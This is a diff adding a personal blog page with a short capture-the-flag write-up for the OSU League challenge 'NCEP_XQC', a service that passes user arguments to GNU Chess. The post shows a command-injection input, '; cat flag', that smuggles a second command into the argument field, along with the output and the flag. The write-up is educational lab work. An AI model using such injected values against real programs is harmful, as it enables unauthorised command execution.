@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="For this challenge, we are given a simple program that just runs GNU chess. Right away we can see that it lets us input command line arguments! Maybe we can just do a simple commandline injection to cat the flag:
+$ nc ctf.ropcity.com 31314 WELCOME TO THE NORWEGIAN COLLEGE OF ELITE PWN Please enter your custom command line arguments, or just hit enter to begin your training: ; cat flag executing command: /usr/games/gnuchess -g -m ; cat flag GNU Chess 6." />
+<meta name="keywords" content=", osuleague, ctf, security" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/blog/ncep_xqc/" />
+
+
+    <title>
+        
+            OSU League 2020/2021 - NCEP_XQC Writeup :: Cameron McCawley 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="OSU League 2020/2021 - NCEP_XQC Writeup">
+<meta itemprop="description" content="For this challenge, we are given a simple program that just runs GNU chess. Right away we can see that it lets us input command line arguments! Maybe we can just do a simple commandline injection to cat the flag:
+$ nc ctf.ropcity.com 31314 WELCOME TO THE NORWEGIAN COLLEGE OF ELITE PWN Please enter your custom command line arguments, or just hit enter to begin your training: ; cat flag executing command: /usr/games/gnuchess -g -m ; cat flag GNU Chess 6.">
+
+<meta itemprop="wordCount" content="149"><meta itemprop="image" content=""/>
+<meta itemprop="keywords" content="osuleague,ctf,security," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="OSU League 2020/2021 - NCEP_XQC Writeup"/>
+<meta name="twitter:description" content="For this challenge, we are given a simple program that just runs GNU chess. Right away we can see that it lets us input command line arguments! Maybe we can just do a simple commandline injection to cat the flag:
+$ nc ctf.ropcity.com 31314 WELCOME TO THE NORWEGIAN COLLEGE OF ELITE PWN Please enter your custom command line arguments, or just hit enter to begin your training: ; cat flag executing command: /usr/games/gnuchess -g -m ; cat flag GNU Chess 6."/>
+
+
+
+    <meta property="og:title" content="OSU League 2020/2021 - NCEP_XQC Writeup" />
+<meta property="og:description" content="For this challenge, we are given a simple program that just runs GNU chess. Right away we can see that it lets us input command line arguments! Maybe we can just do a simple commandline injection to cat the flag:
+$ nc ctf.ropcity.com 31314 WELCOME TO THE NORWEGIAN COLLEGE OF ELITE PWN Please enter your custom command line arguments, or just hit enter to begin your training: ; cat flag executing command: /usr/games/gnuchess -g -m ; cat flag GNU Chess 6." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog/ncep_xqc/" /><meta property="og:image" content=""/><meta property="article:section" content="blog" />
+
+<meta property="og:site_name" content="Cameron McCawley" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/cameronmccawley</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/blog/">Blog</a></li><li><a href="/resume.pdf">Resume</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/blog/ncep_xqc/">OSU League 2020/2021 - NCEP_XQC Writeup</a></h2>
+
+            
+
+            <div class="post-content">
+                <p>For this challenge, we are given a simple program that just runs GNU chess.
+Right away we can see that it lets us input command line arguments! Maybe we can just do a simple commandline injection to cat the flag:</p>
+<pre><code>$ nc ctf.ropcity.com 31314
+WELCOME TO THE NORWEGIAN COLLEGE OF ELITE PWN
+Please enter your custom command line arguments, or just hit enter to begin your training: ; cat flag
+executing command: /usr/games/gnuchess -g -m ; cat flag
+
+GNU Chess 6.2.5
+Copyright (C) 2017 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+White (1) : quit
+osu{WeLc0m3_T0_tH3_c0LLe6e_0f_pWN}
+
+finished executing command /usr/games/gnuchess -g -m ; cat flag
+</code></pre><p>And we get the flag!<br>
+<code>osu{WeLc0m3_T0_tH3_c0LLe6e_0f_pWN}</code></p>
+<p>Welp&hellip; Looks like that was it. A good beginner challenge!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  				<p>
+  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="tags/osuleague">osuleague</a></span><span class="tag"><a href="tags/ctf">ctf</a></span><span class="tag"><a href="tags/security">security</a></span>
+  				</p>
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            
+                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            <span> <a href="posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+
+
+
+
+		
+    </body>
+</html>
